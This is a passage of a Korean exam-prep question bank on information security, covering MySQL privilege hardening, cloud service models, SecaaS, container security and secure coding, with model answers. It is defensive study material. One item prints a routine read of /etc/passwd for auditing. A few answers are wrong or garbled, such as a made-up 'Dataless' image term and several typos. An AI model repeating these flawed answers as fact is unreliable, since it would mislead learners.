<summary>(단답형) 데이터베이스 내의 데이터를 외부 파일로 저장(SELECT INTO OUTFILE)하거나 외부 파일을 읽어 들일 수 있어 시스템 침투의 빌미가 되는 민감한 권한 명칭은?</summary>
<blockquote>
<strong>정답:</strong> <strong>File_priv</strong> (File 권한)
</blockquote>
</details>

<details>
<summary>(단답형) 현재 수행 중인 질의를 모니터링할 수 있는 <code>show processlist</code> 명령 실행 권한으로, 타인의 질의문에 포함된 비밀번호 노출 위험이 있는 권한 명칭은?</summary>
<blockquote>
<strong>정답:</strong> <strong>Process_priv</strong> (Process 권한)
</blockquote>
</details>

<details>
<summary>(단답형) 외부 사용자가 리눅스 OS 수준에서 <code>mysql</code> 서비스 계정으로 직접 로그인하지 못하도록 <code>/etc/passwd</code>에 설정해야 하는 쉘 경로는?</summary>
<blockquote>
<strong>정답:</strong> <strong>/bin/false</strong> (또는 /sbin/nologin)
</blockquote>
</details>

<details>
<summary>(단답형) 원격지에서 전용 관리 도구(mysqladmin) 등을 이용해 서버 서비스를 강제로 종료시킬 수 있는 고위험 권한 명칭은?</summary>
<blockquote>
<strong>정답:</strong> <strong>Shutdown_priv</strong> (Shutdown 권한)
</blockquote>
</details>

<details>
<summary>(서술형) MySQL 초기 설치 직후 <strong>관리자(root) 계정</strong>에 대해 수행해야 할 필수적인 보안 조치 2가지를 기술하시오.</summary>
<blockquote>
<strong>정답:</strong><br>
1. 보안상 비어 있도록(NULL) 설정된 <strong>초기 비밀번호를 복잡한 문자열로 즉시 설정</strong>한다.<br>
2. 널리 알려진 계정명인 <strong>'root'를 추측하기 어려운 다른 이름으로 변경</strong>하여 무차별 대입(Brute Force) 공격을 방지한다.
</blockquote>
</details>

<details>
<summary>(서술형) <strong>Process_priv</strong> 권한이 비인가된 일반 사용자에게 주어졌을 때 발생할 수 있는 정보 유출 시나리오를 설명하시오.</summary>
<blockquote>
<strong>정답:</strong> 해당 권한을 가진 사용자는 <code>SHOW PROCESSLIST</code> 명령을 통해 당시 실행 중인 모든 질의를 모니터링할 수 있다. 만약 다른 사용자가 비밀번호를 변경하거나 생성하는 쿼리를 날릴 때 <strong>평문 패스워드가 포함</strong>되어 있다면, 공격자는 이를 가로채어 중요 정보를 탈취할 수 있다.
</blockquote>
</details>

<details>
<summary>(서술형) MySQL 데이터 디렉토리(<code>datadir</code>)의 접근 권한이 <strong>777</strong>로 설정된 경우의 위험성과 네트워크 서비스에 미치는 영향을 서술하시오.</summary>
<blockquote>
<strong>정답:</strong> 위험성: 서버 내의 모든 일반 사용자가 <strong>원본 데이터 파일 및 로그 파일에 마음대로 접근하여 삭제하거나 위조</strong>할 수 있는 권한을 얻게 된다. 이는 데이터베이스 서비스의 가용성 상실과 데이터 무결성 파괴를 초래하므로 반드시 750 이하로 권한을 축소하고 소유자를 제한해야 한다.
</blockquote>
</details>

<details>
<summary>(작업형) MySQL <code>user</code> 테이블에서 <code>admin</code> 계정의 비밀번호를 <code>SecuPass!@#</code>로 변경하는 쿼리를 작성하시오.</summary>
<blockquote>
<strong>정답:</strong> <code>UPDATE mysql.user SET password=PASSWORD('SecuPass!@#') WHERE user='admin';</code>
</blockquote>
</details>

<details>
<summary>(작업형) MySQL 서비스를 3306 포트를 이용한 네트워크 기반 통신이 아닌 로컬 통신으로만 국한시키려 한다. <code>my.cnf</code> 파일의 <code>[mysqld]</code> 섹션 하단에 추가해야 할 설정 문구는?</summary>
<blockquote>
<strong>정답:</strong> <strong>skip-networking</strong>
</blockquote>
</details>

<details>
<summary>(작업형) 다음 명령어의 실행 결과가 의미하는 보안적 해석을 쓰시오.<br><code>cat /etc/passwd | grep mysql</code><br>결과: <code>mysql:x:27:27::/var/lib/mysql:/bin/bash</code></summary>
<blockquote>
<strong>정답:</strong> <code>mysql</code> 서비스 계정에 <strong>정상적인 로그인 쉘(/bin/bash)</strong>이 설정되어 있어 서비스 목적 외에 외부에서 직접 해당 계정으로 로그인할 수 있는 보안 취약점이 존재한다. (수정 방안: /bin/false로 변경)
</blockquote>
</details>

<details>
<summary>(작업형) MySQL 권한 테이블 계층 중, 특정 테이블 수준에서의 세부 권한(Select, Insert 등)을 관리하는 전용 테이블의 명칭은?</summary>
<blockquote>
<strong>정답:</strong> <strong>tables_priv</strong>
</blockquote>
</details>

## [12] 클라우드 컴퓨팅 보안

### 클라우드 컴퓨팅 개요 및 특징

<details>
<summary>(단답형) 클라우드 컴퓨팅의 핵심 기술로, 물리적인 IT 자원을 동시에 다수의 논리적인 자원으로 사용하여 활용도를 극대화하는 기술은?</summary>
<blockquote>
<strong>정답:</strong> <strong>가상화 (Virtualization)</strong>
</blockquote>
</details>

<details>
<summary>(단답형) 사용자가 IT 자원을 필요한 만큼 빌려서 사용하고, 실제 사용한 양에 따라 비용을 지불하는 클라우드의 과금 체계 방식은?</summary>
<blockquote>
<strong>정답:</strong> <strong>종량제 (Pay-as-you-go)</strong>
</blockquote>
</details>

<details>
<summary>(단답형) 물리적인 다수의 서버를 가상 서버로 통합하여 전체적인 관리 비용과 인프라 복잡도를 감소시키는 가상화 기술은?</summary>
<blockquote>
<strong>정답:</strong> <strong>서버 가상화</strong>
</blockquote>
</details>

<details>
<summary>(단답형) 사용자 컴퓨터에 프로그램을 개별적으로 설치하지 않고, 중앙의 가상화 서버를 통해 필요할 때마다 실행하여 제공하는 전달 방식은?</summary>
<blockquote>
<strong>정답:</strong> <strong>애플리케이션 가상화</strong>
</blockquote>
</details>

<details>
<summary>(단답형) 물리적 네트워크를 논리적으로 통합하거나 세분화하여, 하드웨어 장비에 구애받지 않고 유연하게 네트워크 자원을 구성하는 기술은?</summary>
<blockquote>
<strong>정답:</strong> <strong>네트워크 가상화</strong>
</blockquote>
</details>

<details>
<summary>(단답형) 개별 물리적 저장 장치들을 하나로 묶어 거대한 가상 저장소 풀을 만들고, 사용자별로 필요한 용량만큼 재할당하는 기술은?</summary>
<blockquote>
<strong>정답:</strong> <strong>스토리지 가상화</strong>
</blockquote>
</details>

<details>
<summary>(서술형) <strong>클라우드 컴퓨팅 발전 및 이용자 보호에 관한 법률</strong>에 명시된 클라우드 컴퓨팅의 법적 정의를 기술하시오.</summary>
<blockquote>
<strong>정답:</strong> 집적·공유된 정보통신 기기, 설비, 소프트웨어 등 <strong>정보통신 자원</strong>을 이용자의 요구 또는 수요 변화에 따라 <strong>정보통신망을 통하여 유동적</strong>으로 이용할 수 있도록 하는 정보처리 체계이다.
</blockquote>
</details>

<details>
<summary>(서술형) 가상화 기술이 클라우드 컴퓨팅 환경에 기여하는 핵심적인 차별점 2가지를 전통적인 컴퓨팅 환경(On-Premise)과 비교하여 설명하시오.</summary>
<blockquote>
<strong>정답:</strong><br>
1. <strong>자원의 소유성</strong>: 이용자가 하드웨어를 직접 구매하여 소유하지 않고 가상화된 형태로 <strong>필요한 만큼만 빌려 사용</strong>한다.<br>
2. <strong>유연한 확장성</strong>: 물리적 장비의 추가 없이도 <strong>실시간으로 자원 할당 및 회수</strong>가 가능하여 서비스 변화에 유동적으로 대응할 수 있다.
</blockquote>
</details>

<details>
<summary>(서술형) <strong>데스크톱 가상화</strong>의 구체적인 개념과 보안 및 비용 측면에서의 도입 목적을 서술하시오.</summary>
<blockquote>
<strong>정답:</strong> 데스크톱 가상화는 다양한 이기종 OS 환경(윈도우, 리눅스 등)을 사용자 컴퓨터가 아닌 <strong>중앙 서버의 가상화 기술</strong>을 통해 이용하는 방식이다. 이는 중요 데이터를 중앙에서 관리하여 보안을 강화하고, 노후되거나 저성능인 사용자 컴퓨터에서도 고성능 환경을 제공할 수 있어 <strong>유지관리비용(TCO) 절감</strong>을 목적으로 한다.
</blockquote>
</details>

<details>
<summary>(작업형) 다음 클라우드 컴퓨팅의 주요 특징 중 성격이 다른 하나를 고르시오.<br>(A) IT 자원 임대 방식 / (B) 실시간 확장성 지원 / (C) 물리적 장비 단위의 소유 및 관리 / (D) 사용량 기반 과금 정책</summary>
<blockquote>
<strong>정답:</strong> <strong>(C)</strong> (클라우드는 가상화된 자원을 빌려 쓰는 방식으로 물리 장비를 직접 소유/관리하지 않음)
</blockquote>
</details>

<details>
<summary>(작업형) 아래의 가상화 대상을 해당 방식에 맞게 연결하시오.<br>(1) 애플리케이션 / (2) 서버 / (3) 스토리지 / (4) 네트워크<br>(A) 다수의 물리 서버 통합 / (B) 중앙 서버를 통한 소프트웨어 제공 / (C) 물리 리소스를 논리 요소로 구성 / (D) 개별 저장 용량 통합 및 풀(Pool)화</summary>
<blockquote>
<strong>정답:</strong> (1)-<strong>(B)</strong>, (2)-<strong>(A)</strong>, (3)-<strong>(D)</strong>, (4)-<strong>(C)</strong>
</blockquote>
</details>

### 클라우드 컴퓨팅 분류

<details>
<summary>(단답형) 이용자에게 서버, 스토리지, 네트워크 하드웨어와 같은 IT 인프라 자원을 가상화하여 서비스 형태로 제공하는 모델은?</summary>
<blockquote>
<strong>정답:</strong> <strong>IaaS (Infrastructure as a Service)</strong>
</blockquote>
</details>

<details>
<summary>(단답형) 애플리케이션 개발 및 실행에 필요한 OS, 웹 서버(WAS), 데이터베이스, 개발 프레임워크 등을 플랫폼 형태로 제공하는 모델은?</summary>
<blockquote>
<strong>정답:</strong> <strong>PaaS (Platform as a Service)</strong>
</blockquote>
</details>

<details>
<summary>(단답형) 클라우드 상의 소프트웨어를 별도의 설치 없이 웹 등을 통해 즉시 사용할 수 있도록 제공하는 완성형 서비스 모델은?</summary>
<blockquote>
<strong>정답:</strong> <strong>SaaS (Software as a Service)</strong>
</blockquote>
</details>

<details>
<summary>(단답형) 불특정 다수 사용자를 대상으로 하며 클라우드 사업자가 인프라와 접근 제어를 중앙에서 관리하는 대규모 배치 모델 명칭은?</summary>
<blockquote>
<strong>정답:</strong> <strong>퍼블릭 (Public) 클라우드</strong>
</blockquote>
</details>

<details>
<summary>(단답형) 기업이나 기관 내부에서 클라우드 솔루션을 구축하여 폐쇄적으로 운영함으로써 강력한 보안과 커스터마이징을 보장하는 모델 명칭은?</summary>
<blockquote>
<strong>정답:</strong> <strong>프라이빗 (Private) 클라우드</strong>
</blockquote>
</details>

<details>
<summary>(단답형) 핵심 보안 데이터는 내부 인프라에, 일반적인 서비스 확장은 외부 클라우드에 배치하여 두 모델의 장점을 결합한 형태는?</summary>
<blockquote>
<strong>정답:</strong> <strong>하이브리드 (Hybrid) 클라우드</strong>
</blockquote>
</details>

<details>
<summary>(단답형) 네이버 클라우드 브리박스, 구글 드라이브와 같은 웹 기반 개인용 스토리지 서비스는 3가지 서비스 모델 중 어디에 해당한가?</summary>
<blockquote>
<strong>정답:</strong> <strong>SaaS</strong>
</blockquote>
</details>

<details>
<summary>(단답형) 온프레미스(On-Premise) 환경과 비교할 때, IaaS 환경에서 클라우드 사업자(Vendor)가 전담하여 관리하기 시작하는 계층의 핵심 기술은?</summary>
<blockquote>
<strong>정답:</strong> <strong>가상화 (Virtualization)</strong>
</blockquote>
</details>

<details>
<summary>(서술형) <strong>PaaS(Platform as a Service)</strong>를 도입할 경우, 개발자가 인프라 구축 측면에서 얻을 수 있는 가장 큰 이점을 온프레미스 환경과 비교하여 설명하시오.</summary>
<blockquote>
<strong>정답:</strong> 온프레미스에서는 개발 전 서버 구매, OS 및 미들웨어 설치, 개발 환경 세팅 등 인프라 준비에 많은 시간과 비용이 소모된다. 반면 PaaS는 이러한 <strong>플랫폼 환경이 이미 구축되어 제공</strong>되므로 개발자는 인프라 관리 부담 없이 <strong>애플리케이션 개발과 비즈니스 로직 구현에만 집중</strong>할 수 있다.
</blockquote>
</details>

<details>
<summary>(서술형) 서비스 모델에 따른 <strong>사업자(Vendor)의 관리 책임 범위</strong>가 가상화 계층부터 애플리케이션까지 어떻게 확장되는지 IaaS, PaaS, SaaS 단계별로 서술하시오.</summary>
<blockquote>
<strong>정답:</strong> <strong>IaaS</strong>는 가상화와 하드웨어 자원까지만 사업자가 관리하며, <strong>PaaS</strong>는 여기에 OS, 미들웨어, 런타임 플랫폼까지 관리 범위를 넓힌다. <strong>SaaS</strong>는 애플리케이션 소프트웨어 전체 스택을 사업자가 책임지고 관리하며 사용자는 서비스 이용만 담당한다.
</blockquote>
</details>

<details>
<summary>(서술형) <strong>퍼블릭 클라우드</strong>와 <strong>프라이빗 클라우드</strong>를 도입 비용과 시스템 커스터마이징 유연성 관점에서 정반대의 특성을 갖는 이유를 설명하시오.</summary>
<blockquote>
<strong>정답:</strong> 퍼블릭 클라우드는 자원 공유를 통해 <strong>초기 도입 비용이 낮지만</strong> 범용 서비스를 제공하므로 개별 조직에 맞춘 상세 커스터마이징에는 제약이 있다. 반면 프라이빗 클라우드는 초기 구축 비용과 시간이 많이 소요되는 대신, 조직의 보안 정책에 맞춰 <strong>유동성과 커스터마이징 유연성을 극대화</strong>할 수 있다.
</blockquote>
</details>

<details>
<summary>(작업형) 다음 클라우드 서비스 모델과 구체적인 예시를 올바르게 연결하시오.<br>(1) IaaS / (2) PaaS / (3) SaaS<br>(A) Salesforce CRM, Dropbox / (B) Google AppEngine, MS Azure / (C) AWS EC2, S3 </summary>
<blockquote>
<strong>정답:</strong> (1)-<strong>(C)</strong>, (2)-<strong>(B)</strong>, (3)-<strong>(A)</strong>
</blockquote>
</details>

<details>
<summary>(작업형) 하이브리드 클라우드 설계를 담당하는 보안 전문가로서, "외부 노출을 원치 않는 극비 프로젝트 데이터"를 서버에 배치할 때 권장되는 클라우드 형태는?</summary>
<blockquote>
<strong>정답:</strong> <strong>프라이빗 (Private) 클라우드 영역</strong>
</blockquote>
</details>

<details>
<summary>(작업형) 벤더의 관리 영역(Managed by vendor) 다이어그램을 참고할 때, PaaS 환경에서 사용자가 직접 관리 책임을 져야 하는 2가지 주요 항목은?</summary>
<blockquote>
<strong>정답:</strong> <strong>애플리케이션(Apps), 데이터(Data)</strong>
</blockquote>
</details>

### 클라우드 기반 보안 서비스: SecaaS

<details>
<summary>(단답형) 보안 솔루션을 기업 내부에 구축하지 않고, 클라우드(인터넷)를 통해 필요한 만큼 주문형(On-Demand) 방식으로 제공받는 서비스 모델은?</summary>
<blockquote>
<strong>정답:</strong> <strong>SecaaS (Security as a Service)</strong>
</blockquote>
</details>

<details>
<summary>(단답형) SecaaS는 클라우드 소프트웨어 완성형 서비스를 제공한다는 측면에서 어떤 서비스 모델(IaaS, PaaS, SaaS 중)의 한 종류로 분류되는가?</summary>
<blockquote>
<strong>정답:</strong> <strong>SaaS (Software as a Service)</strong>
</blockquote>
</details>

<details>
<summary>(단답형) 클라우드 보안 연합(CSA)이 정의한 보안 분야 중, 사용자 인증과 접근 권한 관리를 포함한 신원 기반의 통계를 제공하는 서비스는?</summary>
<blockquote>
<strong>정답:</strong> <strong>IAM (Identity and Access Management)</strong>
</blockquote>
</details>

<details>
<summary>(단답형) 이동 중이거나 사용 중인 데이터의 보안 상태를 모니터링하여 중요 정보의 외부 유출이나 손실을 방지하는 서비스 명칭은?</summary>
<blockquote>
<strong>정답:</strong> <strong>DLP (Data Loss Prevention)</strong>
</blockquote>
</details>

<details>
<summary>(단답형) 보안 로그 및 이벤트 정보를 수집하여 실시간으로 상관관계를 분석하고 위협을 정밀히 탐지하는 관리 서비스의 명칭은?</summary>
<blockquote>
<strong>정답:</strong> <strong>SIEM (Security Information & Event Management)</strong>
</blockquote>
</details>

<details>
<summary>(단답형) 예기치 못한 서비스 중단이나 재난 발생 시 운영의 탄력성을 보장하고 신속한 복구를 지원하는 서비스의 약어는?</summary>
<blockquote>
<strong>정답:</strong> <strong>BCDR (Business Continuity and Disaster Recovery)</strong>
</blockquote>
</details>

<details>
<summary>(단답형) 인터넷을 통해 대상 인프라나 시스템의 보안 취약점을 원격으로 스캔하여 보안 상태를 진단해 주는 서비스는?</summary>
<blockquote>
<strong>정답:</strong> <strong>취약점 검사 (Vulnerability Scanning)</strong>
</blockquote>
</details>

<details>
<summary>(단답형) 웹 트래픽을 프록시(Proxy) 처리하여 외부로 공개된 웹 애플리케이션 서비스를 실시간으로 보호하는 보안 서비스 분야는?</summary>
<blockquote>
<strong>정답:</strong> <strong>웹 보안 (Web Security)</strong>
</blockquote>
</details>

<details>
<summary>(단답형) 인바운드 및 아웃바운드 이메일을 정밀 제어하여 피싱, 스팸, 악성 첨부파일로부터 조직의 메일 시스템을 보호하는 서비스는?</summary>
<blockquote>
<strong>정답:</strong> <strong>이메일 보안 (Email Security)</strong>
</blockquote>
</details>

<details>
<summary>(서술형) 기존 시스템 구축형 보안 솔루션과 비교할 때 **SecaaS** 도입이 기업의 초기 투자 비용과 전문성 확보 측면에서 주는 장점을 설명하시오.</summary>
<blockquote>
<strong>정답:</strong><br>
1. <strong>초기 투자 비용 절감</strong>: 보안 장비 구입이나 물리적 인프라 구축비 없이 필요한 만큼만 지불(Pay-as-you-go)하므로 경제적이다.<br>
2. <strong>전문성 보강</strong>: 최신 위협에 특화된 <strong>전문 보안 기업의 서비스</strong>를 민초하게 제공받음으로써 내부 보안 인력 확보의 부담을 덜고 기업의 핵심 역량에 집중할 수 있다.
</blockquote>
</details>

<details>
<summary>(서술형) <strong>보안 감사(Security Assessments)</strong> 서비스가 클라우드 환경에서 제3자(Third-party) 관점에서 수행하는 역할의 핵심을 서술하시오.</summary>
<blockquote>
<strong>정답:</strong> 업계 표준 및 규제 준수 여부를 기반으로, 클라우드 서비스를 제공하거나 이용하는 환경에 대해 객관적인 신뢰성을 검증하기 위한 <strong>독립적인 감사 및 평가</strong>를 수행하여 투명성을 확보한다.
</blockquote>
</details>

<details>
<summary>(서술형) <strong>지속적인 모니터링(Continuous Monitoring)</strong> 기능이 클라우드 보안 상태 관리에서 갖는 목적을 기술하시오.</summary>
<blockquote>
<strong>정답:</strong> 조직의 현재 보안 수준과 위험 상태를 나타내는 지표를 <strong>실시간으로 지속 관리</strong>함으로써, 잠재적인 보안 사고를 예방하고 변화하는 시스템 환경에 따른 위험 요소를 능동적으로 통제하기 위함이다.
</blockquote>
</details>

<details>
<summary>(작업형) 클라우드 보안 연합(CSA)이 정의한 다음 보안 서비스 분야와 그 주요 기능을 올바르게 연결하시오.<br>(1) 암호화 / (2) 침입 관리 / (3) IAM<br>(A) 패턴 인식을 통한 침입 시도 방지 및 탐지 / (B) 기밀성 유지를 위한 데이터의 해독 불가능 상태 변환 / (C) 인증 및 사용자의 접근 권한 관리 </summary>
<blockquote>
<strong>정답:</strong> (1)-<strong>(B)</strong>, (2)-<strong>(A)</strong>, (3)-<strong>(C)</strong>
</blockquote>
</details>

<details>
<summary>(작업형) 다음 중 "인터넷 구간의 웹 트래픽을 가로채어 악성 코드를 필터링하거나 웹 공격을 차단하는 서비스"에 가장 부합하는 SecaaS 카테고리는?</summary>
<blockquote>
<strong>정답:</strong> <strong>웹 보안 (Web Security)</strong>
</blockquote>
</details>

### 클라우드 보안 모델 및 설정 관리

<details>
<summary>[568] (단답형) 클라우드 서비스 제공자(CSP)는 물리적 인프라와 가상화 계층을 보호하고, 고객은 데이터, 애플리케이션, OS 설정을 보호한다는 개념으로 클라우드 보안의 핵심 원칙인 이 모델의 명칭을 쓰시오.</summary>
<blockquote>
공유 책임 모델 (Shared Responsibility Model)
</blockquote>
</details>

<details>
<summary>[569] (서술형) IaaS(Infrastructure as a Service) 환경에서 운영체제(OS) 패치 및 방화벽 설정(Security Group)의 책임 주체는 누구인지 '공유 책임 모델' 관점에서 서술하시오.</summary>
<blockquote>
<strong>책임 주체</strong>: 고객(사용자)<br>
<strong>이유</strong>: IaaS에서 CSP는 네트워크, 스토리지 등 하드웨어 인프라만 관리하며, 그 위에 올라가는 OS 선택부터 패치 적용, 네트워크 접근 제어(ACL) 설정은 전적으로 고객의 관리 영역이기 때문이다.
</blockquote>
</details>

<details>
<summary>[570] (단답형) 클라우드 리소스에 대한 접근 권한을 관리하는 서비스로, 사용자/그룹/역할(Role)을 정의하여 '최소 권한의 원칙'을 적용하는 이 서비스의 영문 약어를 쓰시오.</summary>
<blockquote>
<code>IAM</code> (Identity and Access Management)
</blockquote>
</details>

<details>
<summary>[571] (서술형) 클라우드 환경에서 '사용자'에게 직접 권한을 부여하는 것보다 '역할(Role)'을 사용하는 것이 보안상 유리한 이유를 기술하시오.</summary>
<blockquote>
역할(Role)은 필요한 시점에 일시적으로 권한을 위임받아 사용하는 방식이다. 고정된 자격 증명(Access Key)을 사용하지 않고 <strong>임시 자격 증명</strong>을 발급받아 수행하므로, 키 유출 시의 피해를 최소화할 수 있으며 권한 관리가 유연하다.
</blockquote>
</details>

<details>
<summary>[기출 12회 6번 문제] (단답형) 클라우드 서비스(Cloud Service)의 3가지 서비스 모델에 대하여 설명하시오.
1) 서버, 가상화, 네트워크 등 IT 인프라 자원을 서비스 형태로 제공하는 모델: <strong>( A )</strong><br>
2) 개발자가 애플리케이션을 개발, 실행, 관리할 수 있는 플랫폼 환경을 제공하는 모델: <strong>( B )</strong><br>
3) 클라우드 인프라 위에서 구동되는 소프트웨어를 웹을 통해 완전한 서비스 형태로 제공하는 모델: <strong>( C )</strong>
</summary>
<blockquote>
<strong>정답:</strong><br>
(A) <strong>IaaS (Infrastructure as a Service)</strong><br>
(B) <strong>PaaS (Platform as a Service)</strong><br>
(C) <strong>SaaS (Software as a Service)</strong>
</blockquote>
</details>

<details>
<summary>[572] (단답형) 클라우드 스토리지(예: AWS S3) 설정 오류로 인해 발생하는 가장 흔한 보안 사고 유형으로, 인증되지 않은 외부인이 내부 파일을 열람하거나 다운로드할 수 있게 되는 상태를 무엇이라 하는가?</summary>
<blockquote>
퍼블릭 노출 (또는 Public Access 허용)
</blockquote>
</details>

<details>
<summary>[573] (서술형) 클라우드 환경의 보안 위협 중 하나인 '그림자 IT (Shadow IT)'의 개념과 클라우드 가시성 확보의 중요성을 서술하시오.</summary>
<blockquote>
기업의 공식 보안 정책이나 중앙 관리를 벗어나 현업 부서에서 임의로 클라우드 서비스(SaaS, IaaS 등)를 구독하거나 사용하는 것을 의미한다. 이는 보안 담당자가 자산의 위치와 취약점을 파악할 수 없게 만들어 데이터 유출의 사각지대를 형성하므로, 클라우드 자산에 대한 통합 가시성 확보가 필수적이다.
</blockquote>
</details>

<details>
<summary>[574] (단답형) 클라우드 서비스를 안전하게 이용하기 위해 서비스 설정 상태를 지속적으로 모니터링하고, 규정 준수 여부 및 위험 요소를 자동으로 탐지하여 수정하는 보안 솔루션의 영문 약어를 쓰시오.</summary>
<blockquote>
<code>CSPM</code> (Cloud Security Posture Management)
</blockquote>
</details>

<details>
<summary>[575] (서술형) 클라우드 환경에서 'SecGroup(Security Group)'과 'NACL(Network ACL)'의 주요 차이점을 상태(State) 유지 관점에서 서술하시오.</summary>
<blockquote>
<strong>Security Group</strong>: <strong>상태 기반(Stateful)</strong> 검사를 수행하므로 인바운드 허용 시 아웃바운드는 자동으로 허용된다.<br>
<strong>NACL</strong>: <strong>상태 비저장(Stateless)</strong> 검사를 수행하므로 인바운드와 아웃바운드 규칙을 각각 명시적으로 설정해야 한다.
</blockquote>
</details>

<details>
<summary>[576] (단답형) 클라우드 기반 보안 서비스(SecaaS) 중, 지점과 본사 및 클라우드 자원 간의 안전한 연결과 보안 정책(CASB, SWG, FWaaS 등)을 통합 제공하는 최신 아키텍처의 영문 약어를 쓰시오.</summary>
<blockquote>
<code>SASE</code> (Secure Access Service Edge)
</blockquote>
</details>

<details>
<summary>[577] (작업형) 다음 빈칸 (A), (B)를 클라우드 보안 설정 관점에서 채우시오.<br>
<div style="border: 1px solid #777; padding: 10px; margin-top: 10px; border-radius: 5px;">
- 시나리오: 외부 개발자에게 특정 S3 버킷의 정적 파일만 읽도록 허용하려 한다.<br>
- 조치 1: <code>( A )</code> 정책을 통해 해당 개발자의 ID에 필요한 리소스 접근 권한을 최소화하여 부여한다.<br>
- 조치 2: 버킷 자체에도 <code>( B )</code> 정책을 설정하여 특정 IP 대역에서만 접근 가능하도록 이중 제한을 둔다.
</div>
</summary>
<blockquote>
(A) IAM (Identity) 정책<br>
(B) Bucket (버킷) 정책
</blockquote>
</details>

### 컨테이너 및 오케스트레이션 보안 (Docker / Kubernetes)

<details>
<summary>[578] (단답형) 애플리케이션과 실행에 필요한 모든 라이브러리를 하나로 묶어 격리된 환경에서 구동하는 기술로, 최근 클라우드 네이티브 환경의 핵심인 이 기술은?</summary>
<blockquote>
컨테이너 (Container) (또는 Docker)
</blockquote>
</details>

<details>
<summary>[579] (서술형) 가상 머신(VM)과 비교하여 컨테이너가 보안상 가지는 잠재적 위험 요소 중 '커널 공유' 문제를 중심으로 서술하시오.</summary>
<blockquote>
가상 머신은 각 게스트 OS가 독립적인 커널을 가지지만, 컨테이너는 호스트 OS의 <strong>커널을 공유</strong>한다. 따라서 특정 컨테이너에서 커널 취약점을 이용한 <strong>탈출 공격(Container Escape)</strong>이 발생할 경우 호스트 시스템 전체와 다른 컨테이너까지 위협받을 수 있다는 취약점이 있다.
</blockquote>
</details>

<details>
<summary>[580] (단답형) 컨테이너 이미지 생성 시, 불필요한 패키지나 쉘을 포함하지 않고 오직 애플리케이션 실행 파일만 포함하여 공격 표면을 최소화한 이미지를 무엇이라 하는가?</summary>
<blockquote>
Dataless 이미지 (또는 Distroless 이미지)
</blockquote>
</details>

<details>
<summary>[581] (서술형) Dockerfile 작성 시 <code>USER root</code> 설정을 지양하고 일반 사용자 계정을 사용해야 하는 보안적 이유를 기술하시오.</summary>
<blockquote>
컨테이너 내부에서 root 권한으로 프로세스가 구동되면, 만약 컨테이너가 해킹당했을 때 공격자가 호스트 시스템의 root 권한까지 획득할 수 있는 Risk가 커지기 때문이다. 최소 권한 원칙에 따라 서비스를 구동해야 한다.
</blockquote>
</details>

<details>
<summary>[582] (단답형) 컨테이너의 라이프사이클을 관리하고 배포하는 오케스트레이션 도구(Kubernetes 등)에서, 컨테이너가 실행될 때 적용되는 보안 설정(권한, 파일시스템 접근 등)을 정의하는 객체의 명칭을 쓰시오.</summary>
<blockquote>
보안 컨텍스트 (Security Context)
</blockquote>
</details>

<details>
<summary>[583] (서술형) 쿠버네티스(Kubernetes) 환경에서 '네트워크 정책(NetworkPolicy)'의 역할을 전통적인 방화벽과 비교하여 설명하시오.</summary>
<blockquote>
전통적 방화벽이 단말 간의 통신을 제어한다면, 네트워크 정책은 **파드(Pod) 간의 통신**을 L3/L4 수준에서 제어한다. 기본적으로 모든 파드는 서로 통신 가능하므로, 명시적으로 허용된 파드들끼리만 통신하도록 제한하여 보안성을 높인다.
</blockquote>
</details>

<details>
<summary>[584] (단답형) 컨테이너 이미지 내부에 포함된 오픈소스 라이브러리나 OS 패키지의 알려진 취약점(CVE)을 스캐닝하여 안전성을 점검하는 도구 중 대표적인 오픈소스 도구의 명칭은? (힌트: T로 시작)</summary>
<blockquote>
<code>Trivy</code> (또는 Clair)
</blockquote>
</details>

<details>
<summary>[585] (서술형) 소프트웨어 공급망 보안을 위해 컨테이너 이미지에 **디지털 서명**을 하고 수신 측에서 이를 검증해야 하는 이유를 기술하시오.</summary>
<blockquote>
이미지 레지스트리(저장소)에 올라간 이미지가 전송 과정에서 변조되었거나, 공격자가 악성 코드를 심어 제작한 신뢰할 수 없는 이미지가 배포되는 것을 방지하여 <strong>이미지 무결성</strong>을 보장하기 위함이다.
</blockquote>
</details>

<details>
<summary>[586] (단답형) 컨테이너 내부의 프로세스가 호스트의 중요 파일을 수정하거나 민감한 시스템 콜을 호출하는 것을 차단하기 위해 리눅스 커널 수준에서 적용하는 보안 모듈(LSM) 2가지를 쓰시오.</summary>
<blockquote>
AppArmor, SELinux
</blockquote>
</details>

<details>
<summary>[587] (작업형) 다음 빈칸 (A), (B)를 기술하시오.<br>
<div style="border: 1px solid #777; padding: 10px; margin-top: 10px; border-radius: 5px;">
- 보완 조치: 실행 중인 컨테이너가 해킹당하더라도 내부 설정 파일이 변조되는 것을 막기 위해 <code>( A )</code> 옵션을 사용하여 컨테이너를 구동한다.<br>
- 가시성 확보: 쿠버네티스 기동 시 모든 API 요청을 기록하는 <code>( B )</code> 로그를 활성화하여 비정상적인 접근 시도를 사후 추적한다.
</div>
</summary>
<blockquote>
(A) Read-only Root Filesystem (<code>--read-only</code>)<br>
(B) 감사 (Audit)
</blockquote>
</details>

### 소프트웨어 개발 보안

<details>
<summary>[기출 22회 10번 문제] (단답형) SW 개발과정에서 DBMS 조회를 위한 질의문 생성 시 사용되는 고려사항이다. ( )에 들어갈 용어를 기술하시오.<br>
1. 애플리케이션에서 DB연결을 통해 데이터를 처리하는 경우 (A)이 설정된 계정을 사용해야 한다.<br>
2. 외부 입력값이 삽입되는 SQL 쿼리문을 (B)으로 생성해서 실행하지 않도록 해야 한다.<br>
3. 외부 입력값을 이용해 동적으로 SQL 쿼리문을 생성해야 하는 경우, (C)에 대한 검증을 수행한 뒤 사용해야 한다.</summary>
<blockquote>
<strong>정답:</strong> (A) <strong>최소 권한</strong>, (B) <strong>동적 (Dynamic)</strong>, (C) <strong>입력값</strong>
</blockquote>
</details>

<details>
<summary>[588] (기출 25회 13번 문제) (서술형) 행정안전부의 '소프트웨어 개발보안 가이드'에 따르면, 개발 과정 각 단계별 보안 활동을 정의하고 있다. 그중 분석 단계의 보안 활동(보안 요구사항 분석) 결과로 도출되는 산출물 3가지를 기술하시오.</summary>
<blockquote>
1. <strong>보안 요구사항 명세서</strong> (Security Requirements List)<br>
2. <strong>보안 위협 모델링 결과서</strong> (또는 보안 위험 분석 보고서)<br>
3. <strong>데이터 분류 및 기밀 등급 분류표</strong>
</blockquote>
</details>

<details>
<summary>[589] (단답형) 행정안전부 '소프트웨어 개발보안 가이드'에서 정의한 7대 보안 약어(Security Weaknesses) 중, 소스코드의 로직이나 설정이 잘못되어 발생하는 보안 약점이 포함된 범주명을 쓰시오.</summary>
<blockquote>
